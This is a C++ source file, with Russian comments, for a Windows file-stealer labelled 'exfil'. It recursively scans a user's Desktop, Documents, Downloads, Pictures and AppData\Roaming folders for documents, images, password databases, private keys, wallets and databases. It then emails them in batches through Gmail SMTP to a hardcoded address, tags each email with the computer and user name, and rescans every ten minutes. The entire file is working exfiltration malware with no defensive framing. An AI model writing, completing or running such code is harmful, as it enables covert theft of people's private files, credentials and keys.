// exfil.cpp — Windows user-profile file collector + Gmail SMTP exfil
// build: cl /std:c++17 /EHsc exfil.cpp /link ws2_32.lib winhttp.lib secur32.lib crypt32.lib
// требует app password gmail. implicit TLS (port 465). schannel handshake.
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winhttp.h>
#include <schannel.h>
#include <security.h>
#include <sspi.h>
#include <wincrypt.h>
#include <string>
#include <vector>
#include <fstream>
#include <set>
#include <thread>
#include <chrono>
#include <cstdio>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "secur32.lib")
#pragma comment(lib, "crypt32.lib")

// ======================= CONFIG =======================
static const char* MAIL_FROM = "sender@gmail.com";
static const char* MAIL_PASS = "xxxxxxxxxxxxxxxx";    // 16-char app password
static const char* MAIL_TO   = "temnij.lord322@gmail.com";
static const DWORD SLEEP_BETWEEN_MAILS_MS = 30000;    // не спамить gmail
static const DWORD SLEEP_SCAN_MS = 600000;            // пересканировать раз в 10 мин
static const size_t MAX_ATTACH = 18u * 1024 * 1024;   // 18 МБ, чтобы влезть в письмо
// ======================================================

// ---------- base64 ----------
std::string b64(const unsigned char* d, size_t n) {
    static const char* T = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string o; o.reserve(((n + 2) / 3) * 4);
    size_t i = 0;
    for (; i + 2 < n; i += 3) {
        unsigned v = (d[i] << 16) | (d[i+1] << 8) | d[i+2];
        o.push_back(T[(v >> 18) & 63]); o.push_back(T[(v >> 12) & 63]);
        o.push_back(T[(v >> 6) & 63]);  o.push_back(T[v & 63]);
    }
    if (i < n) {
        unsigned v = d[i] << 16;
        if (i + 1 < n) v |= d[i+1] << 8;
        o.push_back(T[(v >> 18) & 63]); o.push_back(T[(v >> 12) & 63]);
        o.push_back((i + 1 < n) ? T[(v >> 6) & 63] : '=');
        o.push_back('=');
    }
    return o;
}
std::string b64(const std::string& s) { return b64((const unsigned char*)s.data(), s.size()); }

// ---------- host id ----------
std::string host_id() {
    char name[64] = {0}; DWORD sz = sizeof(name);
    GetComputerNameA(name, &sz);
    char user[64] = {0}; DWORD us = sizeof(user);
    GetUserNameA(user, &us);
    return std::string(name) + "_" + user;
}

// ---------- schannel TLS wrapper ----------
struct TlsSock {
    SOCKET s = INVALID_SOCKET;
    CredHandle cred{};
    CtxtHandle ctx{};
    SecPkgContext_StreamSizes sizes{};
    bool ready = false;

    bool connect(const char* host, const char* port) {
        addrinfo hints{}, *res = nullptr;
        hints.ai_family = AF_INET; hints.ai_socktype = SOCK_STREAM;
        if (getaddrinfo(host, port, &hints, &res) != 0) return false;
        s = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
        if (connect(s, res->ai_addr, (int)res->ai_addrlen) != 0) {
            freeaddrinfo(res); closesocket(s); return false;
        }
        freeaddrinfo(res);
        return do_handshake(host);
    }

    bool do_handshake(const char* host) {
        SCHANNEL_CRED sc{}; sc.dwVersion = SCHANNEL_CRED_VERSION;
        sc.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT;
        sc.dwFlags = SCH_USE_STRONG_CRYPTO;
        TimeStamp ts;
        if (AcquireCredentialsHandleA(nullptr, (SEC_CHAR*)UNISP_NAME_A,
            SECPKG_CRED_OUTBOUND, nullptr, &sc, nullptr, nullptr, &cred, &ts) != SEC_E_OK)
            return false;

        std::vector<char> inbuf; bool done = false;
        DWORD req = ISC_REQ_SEQUENCE_DETECT | ISC_REQ_REPLAY_DETECT |
                    ISC_REQ_CONFIDENTIALITY | ISC_REQ_EXTENDED_ERROR |
                    ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_STREAM;
        SecBuffer out{}; out.BufferType = SECBUFFER_TOKEN;
        SecBufferDesc outd{ SECBUFFER_VERSION, 1, &out };

        while (!done) {
            DWORD flags = req;
            SECURITY_STATUS ss = InitializeSecurityContextA(&cred, ctx.dwLower ? &ctx : nullptr,
                (SEC_CHAR*)host, req, 0, 0, nullptr, 0, nullptr, &outd, &flags, &ts);
            if (ss == SEC_E_OK) done = true;
            else if (ss == SEC_I_CONTINUE_NEEDED) {
                if (out.cbBuffer && out.pvBuffer) {
                    ::send(s, (const char*)out.pvBuffer, out.cbBuffer, 0);
                    FreeContextBuffer(out.pvBuffer);
                }
                // читать ответ сервера
                std::vector<char> tmp(16384);
                int n = recv(s, tmp.data(), (int)tmp.size(), 0);
                if (n <= 0) return false;
                SecBuffer inb{ (unsigned long)n, SECBUFFER_TOKEN, tmp.data() };
                SecBufferDesc ind{ SECBUFFER_VERSION, 1, &inb };
                out.pvBuffer = nullptr; out.cbBuffer = 0;
                ss = InitializeSecurityContextA(&cred, &ctx, (SEC_CHAR*)host, req, 0, 0,
                                                &ind, 0, nullptr, &outd, &flags, &ts);
                if (out.cbBuffer && out.pvBuffer) {
                    ::send(s, (const char*)out.pvBuffer, out.cbBuffer, 0);
                    FreeContextBuffer(out.pvBuffer);
                }
                if (ss == SEC_E_OK) done = true;
                else if (ss != SEC_I_CONTINUE_NEEDED) return false;
            } else return false;
        }
        QueryContextAttributesA(&ctx, SECPKG_ATTR_STREAM_SIZES, &sizes);
        ready = true;
        return true;
    }

    bool send_all(const std::string& data) {
        size_t sent = 0;
        while (sent < data.size()) {
            size_t chunk = min(data.size() - sent, sizes.cbMaximumMessage);
            std::vector<char> buf(sizes.cbHeader + chunk + sizes.cbTrailer);
            memcpy(buf.data() + sizes.cbHeader, data.data() + sent, chunk);
            SecBuffer sb[4] = {};
            sb[0].BufferType = SECBUFFER_STREAM_HEADER; sb[0].pvBuffer = buf.data(); sb[0].cbBuffer = sizes.cbHeader;
            sb[1].BufferType = SECBUFFER_DATA; sb[1].pvBuffer = buf.data() + sizes.cbHeader; sb[1].cbBuffer = (unsigned long)chunk;
            sb[2].BufferType = SECBUFFER_STREAM_TRAILER; sb[2].pvBuffer = buf.data() + sizes.cbHeader + chunk; sb[2].cbBuffer = sizes.cbTrailer;
            sb[3].BufferType = SECBUFFER_EMPTY;
            SecBufferDesc bd{ SECBUFFER_VERSION, 4, sb };
            if (EncryptMessage(&ctx, 0, &bd, 0) != SEC_E_OK) return false;
            unsigned long total = sb[0].cbBuffer + sb[1].cbBuffer + sb[2].cbBuffer;
            size_t off = 0;
            while (off < total) {
                int n = ::send(s, buf.data() + off, (int)(total - off), 0);
                if (n <= 0) return false;
                off += n;
            }
            sent += chunk;
        }
        return true;
    }

    std::string recv_line_blocking(int timeout_ms) {
        std::string plain;
        DWORD start = GetTickCount();
        std::vector<char> enc(sizes.cbHeader + 16384 + sizes.cbTrailer);
        while (GetTickCount() - start < (DWORD)timeout_ms) {
            int n = recv(s, enc.data(), (int)enc.size(), 0);
            if (n <= 0) break;
            SecBuffer sb[4] = {};
            sb[0].BufferType = SECBUFFER_DATA; sb[0].pvBuffer = enc.data(); sb[0].cbBuffer = n;
            sb[1].BufferType = SECBUFFER_EMPTY;
            sb[2].BufferType = SECBUFFER_EMPTY;
            sb[3].BufferType = SECBUFFER_EMPTY;
            SecBufferDesc bd{ SECBUFFER_VERSION, 4, sb };
            SECURITY_STATUS ss = DecryptMessage(&ctx, &bd, 0, nullptr);
            if (ss == SEC_E_OK) {
                for (int i = 0; i < 4; i++)
                    if (sb[i].BufferType == SECBUFFER_DATA && sb[i].cbBuffer)
                        plain.append((char*)sb[i].pvBuffer, sb[i].cbBuffer);
                if (plain.find("\r\n") != std::string::npos) return plain;
            } else if (ss == SEC_I_CONTEXT_EXPIRED) break;
        }
        return plain;
    }

    void close() {
        if (ctx.dwLower) DeleteSecurityContext(&ctx);
        if (cred.dwLower) FreeCredentialsHandle(&cred);
        if (s != INVALID_SOCKET) closesocket(s);
    }
};

// ---------- SMTP ----------
struct Smtp {
    TlsSock tls;
    bool open(const char* host, const char* port) {
        if (!tls.connect(host, port)) return false;
        tls.recv_line_blocking(5000); // banner 220
        return true;
    }
    std::string cmd(const std::string& c, int code_ok = -1) {
        tls.send_all(c + "\r\n");
        std::string r = tls.recv_line_blocking(8000);
        (void)code_ok;
        return r;
    }
    bool auth() {
        std::string r = cmd("EHLO localhost");
        r = cmd("AUTH LOGIN");
        if (r.substr(0,3) != "334") return false;
        r = cmd(b64(std::string(MAIL_FROM)));
        if (r.substr(0,3) != "334") return false;
        r = cmd(b64(std::string(MAIL_PASS)));
        return r.substr(0,3) == "235";
    }
    bool send_mail(const std::string& subject, const std::string& body,
                   const std::vector<std::pair<std::string, std::string>>& attach) {
        cmd("MAIL FROM:<" + std::string(MAIL_FROM) + ">");
        cmd("RCPT TO:<" + std::string(MAIL_TO) + ">");
        if (cmd("DATA").substr(0,3) != "354") return false;

        std::string boundary = "----=_b" + std::to_string(GetTickCount());
        std::string msg;
        msg += "From: " + std::string(MAIL_FROM) + "\r\n";
        msg += "To: " + std::string(MAIL_TO) + "\r\n";
        msg += "Subject: " + subject + "\r\n";
        msg += "MIME-Version: 1.0\r\n";
        msg += "Content-Type: multipart/mixed; boundary=\"" + boundary + "\"\r\n\r\n";
        msg += "--" + boundary + "\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n";
        msg += body + "\r\n";
        for (auto& a : attach) {
            msg += "--" + boundary + "\r\n";
            msg += "Content-Type: application/octet-stream; name=\"" + a.first + "\"\r\n";
            msg += "Content-Transfer-Encoding: base64\r\n";
            msg += "Content-Disposition: attachment; filename=\"" + a.first + "\"\r\n\r\n";
            // base64 по 76 символов
            const std::string& raw = a.second;
            std::string enc = b64((const unsigned char*)raw.data(), raw.size());
            for (size_t i = 0; i < enc.size(); i += 76) {
                msg += enc.substr(i, 76) + "\r\n";
            }
        }
        msg += "--" + boundary + "--\r\n";
        // dot-stuffing
        std::string out; out.reserve(msg.size() + 16);
        size_t pos = 0;
        while (pos < msg.size()) {
            size_t eol = msg.find("\r\n", pos);
            if (eol == std::string::npos) { out += msg.substr(pos); break; }
            std::string line = msg.substr(pos, eol - pos);
            if (!line.empty() && line[0] == '.') out += ".";
            out += line + "\r\n";
            pos = eol + 2;
        }
        out += ".\r\n";
        tls.send_all(out);
        std::string r = tls.recv_line_blocking(15000);
        cmd("QUIT");
        return r.substr(0,3) == "250";
    }
};

// ---------- file discovery ----------
bool interesting_ext(const std::string& ext) {
    static const std::set<std::string> s = {
        ".txt",".pdf",".doc",".docx",".xls",".xlsx",".ppt",".pptx",".csv",
        ".jpg",".jpeg",".png",".gif",".bmp",
        ".kdbx",".key",".pem",".pfx",".p12",".wallet",".dat",
        ".zip",".rar",".7z",".sql",".db",".sqlite"
    };
    std::string e; for (char c : ext) e.push_back((char)tolower(c));
    return s.count(e) > 0;
}
std::string ext_of(const std::string& p) {
    auto d = p.find_last_of('.');
    return d == std::string::npos ? "" : p.substr(d);
}
std::string leaf(const std::string& p) {
    auto d = p.find_last_of("\\/");
    return d == std::string::npos ? p : p.substr(d + 1);
}

void collect(const std::wstring& dir, std::vector<std::wstring>& out, int depth = 0) {
    if (depth > 4) return; // не уходить слишком глубоко
    WIN32_FIND_DATAW fd;
    HANDLE h = FindFirstFileW((dir + L"\\*").c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return;
    do {
        if (!wcscmp(fd.cFileName, L".") || !wcscmp(fd.cFileName, L"..")) continue;
        std::wstring full = dir + L"\\" + fd.cFileName;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // пропускаем системные
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) continue;
            collect(full, out, depth + 1);
        } else {
            LARGE_INTEGER sz{};
            sz.LowPart = fd.nFileSizeLow; sz.HighPart = fd.nFileSizeHigh;
            if (sz.QuadPart > 0 && sz.QuadPart < (LONGLONG)MAX_ATTACH) {
                std::wstring w = full;
                std::string a(w.begin(), w.end());
                if (interesting_ext(ext_of(a))) out.push_back(full);
            }
        }
    } while (FindNextFileW(h, &fd));
    FindClose(h);
}

std::string read_file(const std::wstring& p) {
    HANDLE f = CreateFileW(p.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (f == INVALID_HANDLE_VALUE) return "";
    LARGE_INTEGER sz{}; GetFileSizeEx(f, &sz);
    if (sz.QuadPart <= 0 || sz.QuadPart > (LONGLONG)MAX_ATTACH) { CloseHandle(f); return ""; }
    std::string d((size_t)sz.QuadPart, 0);
    DWORD rd = 0; ReadFile(f, d.data(), (DWORD)d.size(), &rd, nullptr);
    CloseHandle(f); d.resize(rd);
    return d;
}

// ---------- main loop ----------
int main() {
    WSADATA wsa; WSAStartup(MAKEWORD(2,2), &wsa);
    std::string hid = host_id();
    std::set<std::string> sent_paths;   // не слать дважды в рамках сессии

    for (;;) {
        std::vector<std::wstring> files;
        wchar_t up[MAX_PATH]; GetEnvironmentVariableW(L"USERPROFILE", up, MAX_PATH);
        const wchar_t* subs[] = { L"\\Desktop", L"\\Documents", L"\\Downloads",
                                  L"\\Pictures", L"\\AppData\\Roaming" };
        for (auto s : subs) collect(std::wstring(up) + s, files);

        // формируем пачки: не больше 3 файлов и 18 МБ суммарно на письмо
        Smtp mail; bool mail_open = false;
        std::vector<std::pair<std::string,std::string>> batch;
        size_t batch_bytes = 0;

        auto flush = [&]() {
            if (batch.empty()) return;
            if (!mail_open) { mail_open = mail.open("smtp.gmail.com", "465") && mail.auth(); }
            if (!mail_open) { batch.clear(); batch_bytes = 0; return; }
            std::string subj = "[" + hid + "] " + std::to_string(batch.size()) + " file(s)";
            mail.send_mail(subj, "auto-collected", batch);
            batch.clear(); batch_bytes = 0;
            std::this_thread::sleep_for(std::chrono::milliseconds(SLEEP_BETWEEN_MAILS_MS));
        };

        for (auto& f : files) {
            std::string a(f.begin(), f.end());
            if (sent_paths.count(a)) continue;
            std::string data = read_file(f);
            if (data.empty()) { sent_paths.insert(a); continue; }
            if (batch_bytes + data.size() > MAX_ATTACH || batch.size() >= 3) flush();
            batch.emplace_back(leaf(a), std::move(data));
            batch_bytes += batch.back().second.size();
            sent_paths.insert(a);
        }
        flush();
        if (mail_open) mail.tls.close();

        std::this_thread::sleep_for(std::chrono::milliseconds(SLEEP_SCAN_MS));
    }
    WSACleanup();
    return 0;
}
